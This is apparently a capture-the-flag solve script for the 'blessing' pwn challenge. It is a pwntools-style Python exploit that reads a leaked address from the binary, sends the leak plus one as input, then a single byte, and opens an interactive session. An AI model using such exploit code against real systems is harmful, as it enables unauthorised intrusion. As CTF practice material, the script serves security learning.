#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
import re

context.log_level = 'debug'
exe = context.binary = ELF('./blessing', checksec=False)
libc = exe.libc

def init(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        docker_port = sys.argv[1]
        docker_path = sys.argv[2]
        p = remote("localhost", docker_port)
        sleep(1)
        pid = process(["pgrep", "-fx", docker_path]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
set solib-search-path /home/alter/CTFs/2025/HTBCA/pwn_blessing/challenge/glibc

# brva 0x16CC
# brva 0x171E
brva 0x15EF
brva 0x1739
brva 0x16CC
brva 0x171E
brva 0x170E
c
'''.format(**locals())

p = init()

# ==================== EXPLOIT ====================

def exploit():

    ru(b'Please accept this: ')
    output = rl()[:-1].split(b'\x08')
    leak = int(output[0], 16)    
    slog('Leak', leak)

    sl(str(leak+1))
    sleep(2)
    s(b'A')


    interactive()

if __name__ == '__main__':
    exploit()
